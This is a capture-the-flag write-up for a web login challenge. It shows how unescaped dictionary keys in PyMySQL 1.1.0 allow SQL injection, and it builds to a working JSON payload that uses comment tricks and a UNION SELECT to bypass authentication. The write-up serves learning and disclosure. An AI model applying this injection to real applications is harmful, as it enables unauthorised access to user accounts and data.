UBook: Web - viennabootcamp 2024 (0 solve, upsolved)
===
Upsolved challenge during a bootcamp with some european national teams 
## The challenge
The challenge is a login system. Login as admin gives you the FLAG.
Seems it doesn't 
## Interesting points
### Unserialize
The challenge have a `safe_unserialize` function to manage the json request
```python
def safe_unserialize(obj: any) -> any:
    """Unpickle the object safely. Thx copilot <3"""
    if isinstance(obj, dict):
        return {User.to_user(k): safe_unserialize(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [safe_unserialize(v) for v in obj]
    elif isinstance(obj, str):
        return User.to_user(obj)
    else:
        return obj

```
### User class
This is the user class
```python
class User:
    """User class to handle user data."""
    def __init__(self, name: str, password: str, country: str):
        self.name = name
        self.password = password
        self.country = country

    def get(self, attr: str) -> str:
        return getattr(self, attr, None)

    def __repr__(self) -> str:
        return f'{self.name},{self.country}'
    
    def __str__(self) -> str:
        return f'{self.name},{self.country}'
    
    @staticmethod
    def to_user(s: str) -> 'User':
        # we don't want XSS, so we allow only safe symbols here
        return User(*s.split(',')) if re.match('^[\/\w:\.^\*@]{4,10},[\/\w:\.^\*@]{7,},[A-Z]{2}$', s) else s
```
### Query
All query are done by this function (using PyMySQL==1.1.0)
```python
def query_handler(sql, cur, params=[]):
    try:
        cur.execute(sql, params)
    except Exception as e:
        cur.close()
        app.logger.critical(e)
        abort(500)
    
    return cur
```

Login Query:
```python
[...]
QUERY_GET = "SELECT * FROM users WHERE (BINARY CONCAT(name, ',', country) = %s)"
[...]
cur = query_handler(QUERY_GET, cur, (user,))
[...]
```
## Exploit
So we have to do a SQLi of course but how? Every query is prepared.

Let me check the lib:

This is the `mogrify` function for escape
```python
def mogrify(self, query, args=None):
    conn = self._get_db()

    if args is not None:
        query = query % self._escape_args(args, conn)

    return query
```

So... this is not a real prepared query. Let's see the `_escape_args` function

```python
def _escape_args(self, args, conn):
    if isinstance(args, (tuple, list)):
        return tuple(conn.literal(arg) for arg in args)
    elif isinstance(args, dict):
        return {key: conn.literal(val) for (key, val) in args.items()}
    else:
        # If it's not a dictionary let's try escaping it anyways.
        # Worst case it will throw a Value error
        return conn.escape(args)
```

Oh
return `{key: conn.literal(val) for (key, val) in args.items()}`

The key are not escaped!!!! (after CTF the author([@lavish](https://github.com/lavish)) links his [advisory](https://github.com/advisories/GHSA-v9hf-5j83-6xpp), not found during event :/ )

So if we send this payload we have a syntax error (we can send any json object of course):
```json
[{
    "user":"aaaaa",
    "password":"aaaaa",
    "country":"aaaa"
}]
```
```
(1064, 'You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \'\'user\': "\'aaaaa\'", \'password\': "\'aaaaa\'", \'country\': "\'aaaa\'"})\' at line 1')
```

Okay, obv the curly brackets :(

After a ***big*** amount of hours of search on the internet, the query `mysql syntax curly brackets` I landend to this page [https://dev.mysql.com/doc/refman/8.4/en/expressions.html](https://dev.mysql.com/doc/refman/8.4/en/expressions.html)

Yes, yes, yes i'm noob in google search

## Final Payload

The `__repr__` of user help us to remove the quotes. So start from this

```json
{
    "aaaa,aaaaaaa,AA": null
}
```

```sql
SELECT * FROM users WHERE (BINARY CONCAT(name, ',', country) = {aaaa,AA: 'NULL'})
```

We need some comments for the commas

```json
{
    "aa/*aa,aaaaaaa,AA": null,
    "*/": null
}
```
```sql
SELECT * FROM users WHERE (BINARY CONCAT(name, ',', country) = {aa/*aa,AA: 'NULL', '*/': 'NULL'})
```

YES! Null is an SQL key and not a string. Let's pull all togheter

```json
{
"aa/*aa,aaaaaaa,AA":null,
"*/":"}) UNION SELECT 1,1,SHA2(1,256),1,1 -- ",
"password":"1"
}
```

Enjoy!!!



